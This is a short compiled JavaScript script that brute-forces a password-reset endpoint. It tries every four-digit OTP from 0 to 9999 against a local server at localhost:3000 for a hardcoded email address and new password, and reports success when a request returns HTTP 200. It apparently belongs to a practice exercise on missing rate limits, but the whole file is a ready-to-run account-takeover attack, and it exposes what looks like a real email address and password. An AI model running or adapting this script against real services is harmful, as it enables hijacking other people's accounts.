"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function main(_a) {
    return __awaiter(this, arguments, void 0, function* ({ email, password, otp }) {
        try {
            const response = yield axios_1.default.post("http://localhost:3000/otpauth", {
                email,
                password,
                otp,
            }, {
                headers: {
                    "Content-Type": "application/json",
                },
            });
            console.log(response.status);
            if (response.status === 200) {
                console.log(`Password has changed ${password} with OTP: ${otp}`);
                process.exit(0);
                return;
            }
        }
        catch (error) {
            // console.error(`Error with OTP ${otp}:`, error);
        }
    });
}
function sendRequestsInBatches(batchSize) {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i < 10000; i++) {
            yield main({
                email: "kumashravan5@gmail.com",
                password: "kartdefbueif@123",
                otp: i.toString(),
            });
            // Optionally: Add delay between requests to avoid overwhelming the server
            if ((i + 1) % batchSize === 0) {
                // console.log(`Batch of ${batchSize} requests completed.`);
                yield new Promise((resolve) => setTimeout(resolve, 1000)); // 5 seconds delay
            }
        }
    });
}
// Call the function with a reasonable batch size
sendRequestsInBatches(1000); // Adjust batch size as needed
